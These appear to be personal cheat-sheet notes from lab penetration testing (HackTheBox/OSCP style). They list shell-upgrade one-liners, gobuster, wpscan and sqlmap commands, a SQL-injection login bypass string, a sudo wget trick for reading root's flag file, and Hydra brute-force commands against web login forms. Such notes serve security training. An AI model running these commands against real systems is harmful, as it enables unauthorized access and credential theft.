### upgrading shells

https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html

```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

/bin/sh -i
```

gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k

using wget to reveal the text as /root/root

sudo wget --input-file /root/root.txt

https://gtfobins.github.io/

wpscan --url https://brainfuck.htb --disable-tls-checks

https://rumkin.com/tools/cipher/ for ciphers

`sqlmap -r login.req`

sqlinjection try: `admin'-- -`

Using Hydra

```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"
```

```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect"

```
